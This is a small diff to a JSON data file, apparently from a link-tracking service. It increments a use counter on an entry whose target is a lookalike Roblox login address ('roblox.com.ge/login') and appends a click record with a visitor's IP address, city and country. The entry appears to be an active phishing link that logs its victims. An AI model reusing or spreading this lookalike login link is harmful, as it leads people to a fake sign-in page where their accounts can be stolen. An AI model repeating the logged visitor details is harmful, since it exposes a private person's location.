@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1088,
+    "useCount": 1089,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8848,6 +8848,14 @@
         "city": "Lafayette",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777258946175,
+        "ip": "191.97.99.216",
+        "country": "Argentina",
+        "city": "General Roca",
+        "flag": "🇦🇷",
+        "countryCode": "AR"
       }
     ]
   },
